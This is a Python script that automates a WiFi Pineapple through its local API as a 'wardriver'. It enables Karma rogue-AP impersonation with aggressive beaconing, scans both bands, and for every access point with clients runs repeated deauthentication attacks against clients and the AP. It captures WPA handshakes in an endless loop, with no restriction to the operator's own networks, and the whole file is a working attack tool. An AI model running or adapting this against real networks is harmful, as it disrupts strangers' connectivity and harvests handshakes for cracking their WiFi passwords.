#!/usr/bin/env python3 
#todo: filter for 'Open' networks
# REQUIRES:  /usr/bin/pip install requests

import json, requests, time
cycle = 0
scanid = None

def basic_wardriver_flow():
    global cycle
    global scanid
    s = requests.Session()
    auth = dict()
    auth["username"] = "root"
    auth["password"] = "test"
    continuousScan = True
    scanTime = 120

    reconScanOpts = dict()
    reconScanOpts["live"] = False
    reconScanOpts["band"] = "2" # 0 is 2.4, 1 is 5g, 2 is both
    if (continuousScan):
        reconScanOpts["scanTime"] = 0
    else:
        reconScanOpts["scanTime"] = scanTime
    

    print('starting berserker cycle #' + str(cycle))
    if (cycle < 1):
        print('please allow a minute or two to warm up')

    authResp = s.post("http://172.16.42.1:1471/api/login", json.dumps(auth)).json()
    if (authResp["token"] != None):
        print('authorized')
        s.headers.update({'Authorization': 'Bearer '+authResp["token"]})
    else:
        print('no token')
        exit -1
    #print('checking status')
    #reconStatusResp = s.get("http://172.16.42.1:1471/api/recon/status").json()
    #if (reconStatusResp["scanRunning"]):
    if (cycle < 1):
        print('stopping current scan')
        s.post("http://172.16.42.1:1471/api/recon/stop").json()
        pineAPSettings = {}
        pineAPSettings["mode"] = {}
        pineAPSettings["settings"] = {}
        pineAPSettings["mode"] = "advanced"
        pineAPSettings["settings"]["enablePineAP"] = True
        pineAPSettings["settings"]["autostartPineAP"] = True
        pineAPSettings["settings"]["ap_channel"] = "11"
        pineAPSettings["settings"]["beacon_interval"] = "AGGRESSIVE"
        pineAPSettings["settings"]["beacon_response_interval"] = "AGGRESSIVE"
        pineAPSettings["settings"]["beacon_responses"] = True
        pineAPSettings["settings"]["karma"] = True
        pineAPSettings["settings"]["logging"] = True
        pineAPSettings["settings"]["connect_notifications"] = False
        pineAPSettings["settings"]["disconnect_notifications"] = False
        pineAPSettings["settings"]["capture_ssids"] = False
        pineAPSettings["settings"]["beacon_responses"] = True
        pineAPSettings["settings"]["broadcast_ssid_pool"] = False
        pineAPSettings["settings"]["pineap_mac"] = "5A:11:B0:A7:A9:09"
        pineAPSettings["settings"]["target_mac"] = "FF:FF:FF:FF:FF:FF"
        print('applying settings')
        s.put("http://172.16.42.1:1471/api/pineap/settings", json.dumps(pineAPSettings)).json()
        print('starting recon')
        startReconResponse = s.post("http://172.16.42.1:1471/api/recon/start", json.dumps(reconScanOpts)).json()
        scanid = startReconResponse["scanID"]
        print('SCAN ID: ' + str(startReconResponse["scanID"]))
    print('sleeping to allow recon list to populate')
    if (continuousScan != True):    
        time.sleep(scanTime)
    elif (continuousScan and (cycle > 1)):
        time.sleep(0)
    else:
        time.sleep(90)
    if (continuousScan == False):
        print('stopping recon scan')
        s.post("http://172.16.42.1:1471/api/recon/stop").json()
        time.sleep(5)
    print('getting results of recon scan by ID '+str(scanid))
    api_call = "http://172.16.42.1:1471/api/recon/scans/" + str(scanid)
    print(api_call)
    scanResp = s.get(api_call).json()

    if (scanResp["APResults"] != None):
        print('APs found!')
        for ap in scanResp["APResults"]:
            if (ap["clients"] != None):
                print('associated clients found! ('+str(len(ap["clients"]))+')')
                clientDeauthPayload = dict() 
                bssidDeauthPayload = dict()
                handshakePayload = dict()
                clientArray = []
                handshakePayload["bssid"] = ap["bssid"]
                handshakePayload["channel"] = ap["channel"]
                print('starting handshake')
                hsStartResp = s.post("http://172.16.42.1:1471/api/pineap/handshakes/start", json.dumps(handshakePayload)).json()
                print(hsStartResp)
                # MAKE SURE THIS STARTED 200
                for client in ap["clients"]:
                    clientDeauthPayload["bssid"] = client["ap_mac"]
                    clientDeauthPayload["mac"] = client["client_mac"]
                    clientDeauthPayload["multiplier"] = 5
                    clientDeauthPayload["channel"] = client["ap_channel"]
                    for i in range(5):
                        print('deauthing client: ' +client["client_mac"]+ ' on ' +client["ap_mac"])
                        clientDeauthResp = s.post("http://172.16.42.1:1471/api/pineap/deauth/client", json.dumps(clientDeauthPayload)).json()
                        time.sleep(5)
                        print(clientDeauthResp)
                    clientArray.append(client["client_mac"])
                
                bssidDeauthPayload["bssid"] = ap["bssid"]
                bssidDeauthPayload["multiplier"] = 5
                bssidDeauthPayload["channel"] = ap["channel"]
                bssidDeauthPayload["clients"] = clientArray
                for i in range(5):
                    print('deauthing AP ' +ap["bssid"])
                    bssidDeauthResp = s.post("http://172.16.42.1:1471/api/pineap/deauth/ap", json.dumps(bssidDeauthPayload)).json()
                    time.sleep(5)
                    print(bssidDeauthResp)
                print('sleeping to allow handshakes to come in')
                time.sleep(20)
                print('stopping handshake')
                stopHandshakeResp = s.post("http://172.16.42.1:1471/api/pineap/handshakes/stop").json()
                print(stopHandshakeResp)
                print('getting handshake result')
                handshakesResultResp = s.get("http://172.16.42.1:1471/api/pineap/handshakes").json()
                print(handshakesResultResp)
                notificationPayload = dict()
                notificationPayload["module_name"] = "wardriver"
                
                if (handshakesResultResp["handshakes"] != None):    
                    notificationString = ""
                    for hs in handshakesResultResp["handshakes"]:
                        notificationString = "WARDRIVER HUNGRY! " + hs["mac"]
                        notificationPayload["level"] = 4
                        print('found a handshake!')
                        notificationPayload["message"] = notificationString
                        s.put("http://172.16.42.1:1471/api/notifications", json.dumps(notificationPayload)).json()
                else:
                    notificationString = "No handshakes captured :("
                    notificationPayload["level"] = 3
                    notificationPayload["message"] = notificationString
                    print('no handshakes captured for this AP :(')
                    #s.put("http://172.16.42.1:1471/api/notifications", json.dumps(notificationPayload)).json()
            else:
                print('no client associated with AP')
    else:
        print('no APs found, sleeping 60') # make this go up over time as failures occure
        time.sleep(60)
    cycle += 1
    basic_wardriver_flow()
basic_wardriver_flow()